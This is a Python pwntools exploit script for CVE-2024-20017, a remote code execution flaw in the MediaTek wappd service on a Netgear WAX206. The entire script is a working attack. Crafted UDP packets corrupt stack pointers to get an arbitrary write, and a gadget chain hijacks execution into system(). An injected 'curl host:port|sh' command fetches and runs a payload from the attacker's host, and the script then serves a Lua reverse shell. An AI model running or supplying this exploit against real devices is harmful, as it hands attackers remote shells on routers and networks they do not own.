#!/usr/bin/env python3
import argparse
from pwn import *

# set pwntools log level
context.log_level = 'error'

# ============== CONSTANTS =========================== #
PAD_BYTE = b"\x22"

# ADDRESSES
PLT_SYSTEM      = 0x4025f0
DATA_BASE       = 0x487220

# GADGETS
# 0x459860: mov x0, x24; blr x22;
ROPG_MOV_X0_BLR_X22     = 0x459860


def logger(msg):
    """log stuff"""
    context.log_level = 'info'
    log.info(msg)
    context.log_level = 'error'


def pad(padsize, with_val=None):
    """pad data by a given amount"""
    if with_val:
        return with_val * padsize
    return PAD_BYTE * padsize


def make_header():
    """make the iapp header"""
    header = p8(0)      # version
    header += p8(50)    # command
    header += p16(0)    # ident
    header += p16(0x60) # length
    return header


def make_ssb_struct(pkt_len=0x150):
    """make the SSB struct frame; max len value is 1600"""
    # char buf[8], InitVec
    ssb_pkt = p8(0) * 8

    # use big-endian here to simulate network byte order
    ssb_pkt += p16(pkt_len, endian='big')  # u16 Length
    return ssb_pkt


def arby_write_trigger(pkt_buf_overwrite, cmd_buf_overwrite, ssb_struct_size=0x258):
    """
    Create a payload that will overwrite the pointer used to receive data from sockets (second arg
    to recvfrom(), `pPktBuf`) and overwrite the `FdSet` struct in IAPP_RcvHandler() with NULL.
    Corrupting this pointer with a writeable address will result in subsequent request data being
    written to that address, providing an write to an arbitrary address with controlled data.

    This payload is also able to corrupt the pointers for `pCmdBuf` and `pRspBuf`.

    NULLing FDSET field during the corruption will ensure that other Rcv* handlers aren't called
    which may block and instead we loop back through to the UDP handler with the corrupted pointer
    intact ready for subsequent request to be used to get arbitrary write.
    """
    # iapp header
    header = make_header()
    ssb_pkt = make_ssb_struct(ssb_struct_size)

    # offset to pPktBuf, pCmdBuf, and pRspBuf pointers
    offset_to_pointers = 344

    # Main header and ssbpkt base data; main payload is appended to this
    final = header + ssb_pkt

    # 344 bytes of padding to get the location where the pPktBuf pointer is located on the stack
    final += cyclic(offset_to_pointers)

    # overwrite the pPktBuf pointer (where incoming request data is written to)
    final += p64(pkt_buf_overwrite)

    # overwrite the pCmdBuf pointer
    final += p64(cmd_buf_overwrite) # *pCmdBuf
    # overwrite the pRspBuf pointer
    final += p64(0) # *pRspBuf

    # padding to get up to where `FdSet` value is stored
    final += pad(8*4)

    # here we overwrite `FdSet` so FD_ISSET() won't catch on the other handlers and block
    final += p64(0x0)

    return final


def arbw_rip_hijack_rop2system(buffer_addr, cmd_payload, ssb_struct_size=0x258):
    """
    Leverage the write primitive set up by arby_write_trigger() to put controlled data at a
    predictable address in memory and perform a another round of corruption of the pPktBuf,
    pCmdBuf, and pRspBuf pointers. Along the way, also corrupts the return address on the stack
    to point it to a ROP gadget that eventually ends in a call to system() with arbitrary commands.

    Summary:
        - Inserts a command string at the beginning of the SSB data section of the packet
        - Corrupt $rip to point it to a JOP gadget
            - Moves the value of x24 to x0
            - Jumps to the address stored in x22
        - Places controlled values at the correct offsets in the payload to get them placed in the
          required registers for rop gadget
            - Places address of shell command into 0x24
            - Places address of system@plt in 0x22
        - Nulls out pPktBuf, pCmdBuf, and pRspBuf to avoid crashing when these pointers are passed
          to free()
    Args:
       - buffer_addr: address used to corrupt pPktBuf in the call to arby_write_trigger(); this is
           where the bytes for this request will be written (i.e. where our arb write is happening)
       - cmd_payload: string containing the command we want to execute

    JOP Gadget:
        mov x0, x24; blr x22;
    """
    # iapp header
    header = make_header()
    ssb_pkt = make_ssb_struct(ssb_struct_size)

    # Main header and ssbpkt base data; main payload is appended to this
    final = header + ssb_pkt

    offset_to_pointers = 344
    offset_to_rip = 176

    # write in the shell command payload right at the beginning of the SB packet payload field.
    # we'll be able to reference this string as it is at (buffer_addr+16), assuming the buffer_addr
    # to account for the iapp header and the fields of the ssb struct that come before the payload.
    final += cmd_payload

    # rip overwrite
    final += pad(offset_to_rip-len(cmd_payload))
    final += p64(ROPG_MOV_X0_BLR_X22)

    # we control values in registers at the time where exec gets redirected (assuming the process
    # terminates soon after send this payload); controlled register values come from this next
    # chunk of bytes.
    offset_x22 = 24
    pad_to_x22 = b"\x44" * offset_x22
    offset_x24 = 40

    # value written to x22 (+24)
    # x22 is where the gadget will jump to after setting x0; this should be addr of system()
    # value written to x22 (+24)
    final += pad_to_x22
    final += p64(PLT_SYSTEM)

    # value written to x23 (+32), doesn't matter
    final += pad(8)

    # value written to x24 (+40)
    # x24 needs to contain the address where our command payload is located (i.e. previous
    # corruption addr + 16)
    final += p64(buffer_addr + 16)

    # wrote total of 40 bytes past offset_to_rip+8, use this to calculate remaining bytes of padding
    # use offset_x24 since its the bigger of the two vs x22, so it encapsulates it already
    final += pad(offset_to_pointers - (offset_to_rip + 8 + offset_x24 + 8))

    # # 344 bytes of padding to get the location where the pPktBuf pointer is located on the stack
    # final += cyclic(344 - (176+8))

    # overwrite the pPktBuf pointer (where incoming request data is written to)
    final += p64(0)

    # overwrite the pCmdBuf pointer
    final += p64(0) # *pCmdBuf
    # overwrite the pRspBuf pointer
    final += p64(0) # *pRspBuf

    # padding to get up to where `FdSet` value is stored
    final += pad(8*4)

    # here we overwrite `FdSet` so FD_ISSET() won't catch on the other handlers and block
    final += p64(0x0)

    return final


def serve_rev_shell_payload(host: str, port: int):
    """
    serve reverse shell payload and handle incoming reverse shell connection
    """
    # these commands will be returned to the target and piped to a shell
    lua_rev  = "lua -e \"local s=require('socket');"
    lua_rev += f"local t=assert(s.tcp()); t:connect('{host}',{port});"
    lua_rev += "while true do local r,x=t:receive(); local f=assert(io.popen(r,'r'));"
    lua_rev += "local b=assert(f:read('*a')); t:send(b);"
    lua_rev += "end; f:close(); t:close();\""
    reverse_shell_cmd = lua_rev.encode()

    # basic HTTP response format
    http_head = f"HTTP/1.1 200 OK\r\nContent-Length: {len(reverse_shell_cmd)}\r\n"
    http_head += "Connection: Closed\r\n\r\n"
    http_head = http_head.encode()

    # compose full HTTP response : headers + body
    full_response = http_head + reverse_shell_cmd + b"\r\n\r\n"

    # handle the http request to serve script to spawn reverse shell
    listener = listen(port)
    listener.settimeout(30)
    http = listener.wait_for_connection()

    # loop to wait for http GET
    got_conn = 0
    while got_conn != 1:
        if http.connected():
            listener.sendline(full_response)
            listener.close()
            got_conn = 1
        print("=ERROR=: Timed out waiting for staging connection")

    # loop to wait for reverse shell
    listener = listen(port)
    listener.settimeout(30)
    revshell = listener.wait_for_connection()
    got_conn = 0
    while got_conn != 1:
        if revshell.connected():
            print("[+] ~~~ <REVERSE SHELL START> ~~~")
            listener.interactive()
            return
        print("[!] =ERROR=: Timed out waiting for reverse shell connection, exploit likely failed")


def main(args):
    """
    main
    """
    # the address where we will be able to write controlled data to from the next request we send
    target_write_addr       = DATA_BASE
    # NOTE: must corrupt pCmdBuf with a writeable address that won't interfere with our second
    # payload since pCmdBuf will be written into by the code for packet handling.
    pcmd_buf_overwrite      = target_write_addr + 0x200
    # this is the address we want to corrupt the saved return address with; we use the address of
    # the ROP gadget.
    target_rip_addr         = ROPG_MOV_X0_BLR_X22

    # print out basics
    logger(f"Target: {args.target_ip}:{args.target_port}")
    logger(f"Arbitrary write addr @ {target_write_addr:#x} (.data)")
    logger(f"ROP starting gadget @ {target_rip_addr:#x}")

    # connection used to send requests
    conn = remote(args.target_ip, args.target_port, typ='udp')

    # ======================================================= #
    # 1. send payload that will corrupt pPktBuf pointer to set up the arbitrary write. The next req
    # will be written to the new location that pPktBuf points to. We also corrupt pCmdBuf with this
    # payload, but it doesn't play an important part in the exploit.
    overwrite_1 = arby_write_trigger(target_write_addr, pcmd_buf_overwrite)
    conn.send(overwrite_1)

    logger(f"Sent payload to corrupt pPktBuf and set up for arbitrary write")

    # ======================================================= #
    # 2. send a second payload to make use of the arbitrary write set up in the first payload to
    # write the shell command we want executed at a known address. we also corrupt the saved return
    # addr to gain control of execution and corrupt `pPktBuf` and other pointers again to set them
    # to NULL to avoid crashing on free() during process termination.
    cmd_payload = f"curl {args.lhost}:{args.lport}|sh;\x00"
    cmd_payload = cmd_payload.encode()
    overwrite_2 = arbw_rip_hijack_rop2system(target_write_addr, cmd_payload)
    conn.send(overwrite_2)

    context.log_level = 'info'
    log.info("Sent payload to write to corrupted pPktBuf, corrupt return address, and send "+
             "command payload")

    # handle the incoming requests
    serve_rev_shell_payload(args.lhost, args.lport)


if __name__ == "__main__":
    poc_parser = argparse.ArgumentParser(
        add_help=True,
        description='cve-2024-20017: mtk wappd RCE exploit for Netgear WAX206 (by @hyprdude)',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    poc_parser.add_argument(
        'target_ip',
        help='IP address of host running the service')
    poc_parser.add_argument(
        '--target_port',
        default=3517,
        help="Target port",
        type=int)
    poc_parser.add_argument(
        '--lhost',
        default="192.168.1.8",
        help="Bind IP for reverse shell listener",
        type=str)
    poc_parser.add_argument(
        '--lport',
        default=1337,
        help="Bind port for reverse shell listener",
        type=int)

    arguments = poc_parser.parse_args()
    main(arguments)

